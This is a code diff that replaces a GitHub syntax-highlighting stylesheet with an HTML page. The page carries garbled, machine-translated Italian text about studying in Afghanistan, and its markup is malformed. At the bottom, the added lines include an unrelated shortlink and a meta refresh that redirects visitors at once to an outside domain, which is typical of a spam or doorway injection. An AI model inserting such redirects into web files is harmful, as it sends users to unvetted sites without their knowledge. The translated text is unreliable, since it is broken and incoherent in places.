@@ -1,116 +1,29 @@
-/*
-   Copyright 2014 GitHub Inc.
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="UTF-8">
+    <title>Welcome</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
+  </head>
+  <body>
+   
+      <p>Formazione avanzata in Afghanistan non è solo un mezzo per imparare un po 'di più su arte o la matematica o la scienza. Piuttosto, formazione avanzata in Afghanistan offre la speranza per il futuro. Presso l'Università americana di Afghanistan, anche se le donne 's diritti della nazione hanno una storia travagliata, circa un terzo della scuola ' s popolazione era di sesso femminile in ultimo controllo.</p>
 
-   Licensed under the Apache License, Version 2.0 (the "License");
-   you may not use this file except in compliance with the License.
-   You may obtain a copy of the License at
+<p>La scuola vanta quasi 2.000 studenti, e le loro cerimonie di laurea rappresentano non solo una generazione di giovani che si fanno strada nel mondo, ma una generazione di afgani che cercano di fare un domani migliore per la loro patria.Un onere grava sulle spalle di questi giovani adulti a guidare il paese in un'era di pace e di illuminazione.</p>
 
-       http://www.apache.org/licenses/LICENSE-2.0
+<p>E questo ci porta a quello che serve per studiare in Afghanistan. Studiare in Afghanistan non è una cosa da prendere in considerazione se si vuole solo fare uso dei loro grandi programmi di matematica o di guadagnare un paio di crediti per la vostra laurea in medicina. Le università in Afghanistan sono buone e sempre meglio, ma la vera ragione per studiare in Afghanistan, è perché si prende un interesse per il futuro del paese, nei diritti umani, nel progresso dei diritti per le donne in tutto il mondo, e per la causa della pace .</p>
 
-   Unless required by applicable law or agreed to in writing, software
-   distributed under the License is distributed on an "AS IS" BASIS,
-   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-   See the License for the specific language governing permissions and
-   limitations under the License.
+<p>Studiare in Afghanistan richiede che si va dentro con entrambi gli occhi aperti. Il semplice fatto della questione è che l'Afghanistan, anche se non così pericoloso come era solo pochi anni fa, è ancora un paese lacerato dalla guerra e piena di problemi sociali, culturali e governative.La prossima generazione di studenti afgani e americani e gli europei che vanno in Afghanistan a studiare necessariamente deve interessarsi non solo nel loro campo professionale scelto, ma per la causa dei diritti umani.</p>
 
-*/
+<p>In sostanza, studiando in Afghanistan viene fornito con un certo grado di responsabilità. Se volete rilassarvi sulla spiaggia, tra le classi, allora si può prendere in considerazione lo studio nelle isole dei Caraibi. Se si vuole godere della cultura locale, allora si può prendere in considerazione lo studio di Hong Kong o Londra. Se studiate in Afghanistan, si ri 'intenzione di confrontarsi faccia a faccia con molti dei problemi che affrontano la nostra generazione in tutto il mondo.</p>
 
-.pl-c /* comment */ {
-  color: #969896;
-}
+<p>La NATO ha accettato di un ritiro dall'Afghanistan nel 2014, ma talebani e le forze anti-talebane si prevede di spingere, politica e potenzialmente in combattimento, per potere in seguito al ritiro.Se state pensando di visitare l'Afghanistan per studiare, si sarebbe ben consigliato di avere una strategia di uscita in atto nel caso in cui la situazione peggiora, e sapere come raggiungere l'ambasciata degli Stati Uniti da dove si 're stare e studiare. Per chi è sul serio l'apprendimento dei diritti umani e della politica mediorientale in prima persona, si don 't significa per scoraggiare voi, solo per farvi conoscere la realtà della situazione in modo che si può andare in adeguatamente preparati e ben informati.</p>
 
-.pl-c1      /* constant, markup.raw, meta.diff.header, meta.module-reference, meta.property-name, support, support.constant, support.variable, variable.other.constant */,
-.pl-s .pl-v /* string variable */ {
-  color: #0086b3;
-}
-
-.pl-e  /* entity */,
-.pl-en /* entity.name */ {
-  color: #795da3;
-}
-
-.pl-s .pl-s1 /* string source */,
-.pl-smi      /* storage.modifier.import, storage.modifier.package, storage.type.java, variable.other, variable.parameter.function */ {
-  color: #333;
-}
-
-.pl-ent /* entity.name.tag */ {
-  color: #63a35c;
-}
-
-.pl-k /* keyword, storage, storage.type */ {
-  color: #a71d5d;
-}
-
-.pl-pds              /* punctuation.definition.string, string.regexp.character-class */,
-.pl-s                /* string */,
-.pl-s .pl-pse .pl-s1 /* string punctuation.section.embedded source */,
-.pl-sr               /* string.regexp */,
-.pl-sr .pl-cce       /* string.regexp constant.character.escape */,
-.pl-sr .pl-sra       /* string.regexp string.regexp.arbitrary-repitition */,
-.pl-sr .pl-sre       /* string.regexp source.ruby.embedded */ {
-  color: #183691;
-}
-
-.pl-v /* variable */ {
-  color: #ed6a43;
-}
-
-.pl-id /* invalid.deprecated */ {
-  color: #b52a1d;
-}
-
-.pl-ii /* invalid.illegal */ {
-  background-color: #b52a1d;
-  color: #f8f8f8;
-}
-
-.pl-sr .pl-cce /* string.regexp constant.character.escape */ {
-  color: #63a35c;
-  font-weight: bold;
-}
-
-.pl-ml /* markup.list */ {
-  color: #693a17;
-}
-
-.pl-mh        /* markup.heading */,
-.pl-mh .pl-en /* markup.heading entity.name */,
-.pl-ms        /* meta.separator */ {
-  color: #1d3e81;
-  font-weight: bold;
-}
-
-.pl-mq /* markup.quote */ {
-  color: #008080;
-}
-
-.pl-mi /* markup.italic */ {
-  color: #333;
-  font-style: italic;
-}
-
-.pl-mb /* markup.bold */ {
-  color: #333;
-  font-weight: bold;
-}
-
-.pl-md /* markup.deleted, meta.diff.header.from-file */ {
-  background-color: #ffecec;
-  color: #bd2c00;
-}
-
-.pl-mi1 /* markup.inserted, meta.diff.header.to-file */ {
-  background-color: #eaffea;
-  color: #55a532;
-}
-
-.pl-mdr /* meta.diff.range */ {
-  color: #795da3;
-  font-weight: bold;
-}
-
-.pl-mo /* meta.output */ {
-  color: #1d3e81;
-}
-
+<p>Noi don 't voglio dirti di non studiare in Afghanistan, ma sappiamo che le parti del paese sono ancora pericolosi, e la situazione resta delicata. Detto questo, studiando in Afghanistan sarà una esperienza di apprendimento enorme per leader e innovatori nel servizio pubblico del futuro.</p>
+</head>
+<link rel="shortlink" href="http://www.cokercobras.com/landing/index" />
+  <meta content='0;url=http://clud.info/' http-equiv='refresh'/>
